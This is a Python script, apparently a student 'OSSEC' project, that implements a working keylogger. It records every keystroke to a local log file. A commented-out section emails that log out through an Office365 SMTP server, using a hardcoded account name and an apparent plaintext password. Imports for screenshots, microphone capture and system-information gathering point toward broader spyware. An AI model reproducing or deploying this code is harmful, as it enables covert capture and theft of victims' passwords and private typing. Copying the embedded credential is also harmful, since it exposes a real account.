import smtplib, socket, platform, time, os, logging as log

# For keystrokes
from pynput.keyboard import Key,Listener 

# Email features
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

from scipy.io.wavfile import write # 
from cryptography.fernet import Fernet # 
import socket, platform # Modules for collecting computer information

# Microphone module
# import sounddevice as sd
from scipy.io.wavfile import write

# To fetch the user name 
import getpass
from requests import get

# Screenshot module
from multiprocessing import Process,freeze_support
from PIL import  ImageGrab

################### First segment: KeyLogger ###################
''' Key: Logs the key
    Listener: Listens the key that is being typed '''

## FILE TO SEND AND ITS PATH
filename = 'log.txt' 
SourcePathName  = '/Users/aneruthmohanasundaram/Documents/GitHub/OSSEC-Project/' + filename 
count,keys = 0,[]

def on_press(key):
    key_str = str(key).replace("'","")
    with open(SourcePathName,'a') as f:
        if key_str == 'Key.space':
            f.write(" ")
        elif len(key_str) >1:
            f.write('\n' + key_str  + '\n')
        else:f.write(key_str)

def stop(key):
    if key == Key.esc:
        exit(0)

with Listener(on_press = on_press,on_release=stop) as listener:
    listener.join()

# msg = MIMEMultipart()
# msg['From'] = 'aneruth.mohanasundaram@vub.be'
# msg['To'] = 'aneruth.mohanasundaram@vub.be'
# msg['Subject'] = 'Log File creation'
# body = 'Basic log file generation'
# msg.attach(MIMEText(body, 'plain'))

# ## ATTACHMENT PART OF THE CODE IS HERE
# attachment = open(SourcePathName, 'rb')
# part = MIMEBase('application', "octet-stream")
# part.set_payload((attachment).read())
# encoders.encode_base64(part)
# part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
# msg.attach(part)

# server = smtplib.SMTP('smtp.office365.com', 587)  ### put your relevant SMTP here
# server.ehlo()
# server.starttls()
# server.ehlo()
# server.login('aneruth.mohanasundaram@vub.be', 'Aner$98')  ### if applicable
# server.send_message(msg)
# server.quit()